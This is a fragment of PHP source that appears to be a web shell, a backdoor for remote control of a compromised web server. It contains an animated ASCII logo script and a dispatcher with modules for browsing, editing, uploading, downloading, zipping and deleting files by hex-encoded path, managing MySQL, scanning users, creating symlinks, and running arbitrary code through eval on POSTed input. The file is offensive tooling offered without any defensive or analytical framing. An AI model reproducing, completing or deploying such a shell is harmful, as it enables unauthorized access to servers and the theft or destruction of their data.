%&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;%&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;%&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;%&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;%&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br>%&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;%&nbsp;%&nbsp; &nbsp; &nbsp;%&nbsp; &nbsp; &nbsp; &nbsp;%&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;%&nbsp; &nbsp; &nbsp;%&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; %&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;%&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br>%&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;%&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;%&nbsp;%&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; %&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; %%%%%%%&nbsp; &nbsp;%%%%%&nbsp; &nbsp;%%%% <br><br><br><br><br><br><br></font></td></tr></table></center>";
				
					function strPosList (f_haystack, f_needle) {
						var haystack = f_haystack.toLowerCase();
						var needle = f_needle.toLowerCase();
						var index = 0;
						var f_offset = 0;
						var strList = new Array();
						
						while((index = haystack.indexOf(needle, f_offset)) !== -1) {
							strList.push(index);
							f_offset = index + 1;
						}
						
						return strList;
					}
					
					String.prototype.replaceAt = function(index, offset, str) {
						return this.substr(0, index) + str + this.substr(index+offset);
					}
				   
					function playLogo(strListOf) {
						var rnd = Math.floor(Math.random()*strListOf.length);
						logoTag = logoTag.replaceAt(strListOf[rnd], 1, "_/");
						
						
						divEle.innerHTML = logoTag;
						
						strListOf = strPosList(logoTag, "%");
						if(strListOf.length > 0)
							setTimeout(function() { playLogo(strListOf); }, 15);
					}
					
					playLogo(strPosList(logoTag, "%"));
				</script>';
				
				$NVShl->dPlay($content);	
			}break;
			case 1: {			// EXPLORER
				$NVL_exp = new ExPlorer();
				
				switch($iQ->RCV("act")) {
					case "navigate": {
						$NVL_exp->get_chdir($NVL_exp->hexToStr($POST_iQ['path']));
					}break;
					case "edit": {
						$NVL_exp->get_file($NVL_exp->hexToStr($POST_iQ['path']));	
					}break;
					case "save": {
						$NVL_exp->exp_actions($POST_iQ['content'], $NVL_exp->hexToStr($POST_iQ['path']), $POST_iQ['type'], NULL);
					}break; 
					case "delete": {
						$NVL_exp->exp_actions($NVL_exp->hexToStr($POST_iQ['path']), NULL, $POST_iQ['type'], NULL);
						$NVL_exp->get_chdir($NVL_exp->hexToStr($POST_iQ['returnTo']));
					}break;
					case "zip": {
						$NVL_exp->exp_actions($NVL_exp->hexToStr($POST_iQ['path']), $NVL_exp->hexToStr($POST_iQ['path']).".zip", $POST_iQ['type'], NULL);
						$NVL_exp->get_chdir($NVL_exp->hexToStr($POST_iQ['returnTo']));
					}break;
					case "check_path": {
						$NVL_exp->path_check_and_retrieve($NVL_exp->hexToStr($POST_iQ['path']));
					}
					
					case "copy": {}break;
					case "move": {}break;
					case "rename": {}break;
					case "download": {
						$NVL_exp->exp_actions($NVL_exp->hexToStr($POST_iQ['path']), NULL, $POST_iQ['type'], NULL);
					}break;
					case "upload": {
						$NVL_exp->file_upload_type();
					}break;
					
					case "uploadType": {
						if(isset($_GET['ftp_file_upload_type'])) {
							$_SESSION['ftp_file_upload_type'] = $_GET['ftp_file_upload_type'];
							header("Location: ?t-t");
						} 
					}
				}
			}break;
			case 2: {		// MYSQL
				$NVL_sql = new MySql();
				$NVL_sql->mysql_nontri();
			}break;
			case 3: {		// USERS
				$NVL_usr = new Users();
				switch($iQ->RCV("act")) {
					case "userscan": {
						$NVL_usr->get_users();
					}break;
					case "filescan": {
						$NVL_usr->get_users();
					}break;
					default: {
						echo "Hmmm";	
					}					
				}
			}break;
			case 4: {		// SYSTEM
				$NVL_sys = new SysCMD();
				
				switch($iQ->RCV("act")) {
					case "evaltab": {
						$NVL_sys->doEvalTab();
					}break;
					case "evalthis": {
						$NVL_sys->doEval($POST_iQ['content']);
					}break;
					default: {
						echo "Hmmm";	
					}
				}
			}break;
			
			case 5: {
				$NVL_sym = new SymLnk();
			}break;
			
			default: {
				header("Location: ?t-t");
			}
		}
	}
}
?>